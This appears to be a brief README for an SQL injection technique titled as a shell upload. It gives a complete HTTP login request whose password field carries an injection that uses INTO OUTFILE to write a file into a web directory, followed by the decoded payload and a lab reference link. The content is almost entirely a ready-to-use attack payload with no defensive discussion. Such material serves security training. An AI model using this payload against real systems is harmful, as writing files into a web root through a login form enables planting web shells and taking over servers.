# Sql-Injection-Upload-Shell

Payload Example:
```
POST /checklogin.php HTTP/1.1
Content-Length: 171
Host: 192.168.247.150
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.247.150
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.247.150/index.php?
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

myusername=root&mypassword=%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fjohn%2Fhello.txt%27%20LINES%20TERMINATED%20BY%200x48656c6c6f776f7264--%20-&Submit=Login
```

Decode Payload:
```
' LIMIT 0,1 INTO OUTFILE '/var/www/john/hello.txt' LINES TERMINATED BY 0x48656c6c6f776f7264-- -
```

Reference:
https://www.hetianlab.com/hetian/20211116145438
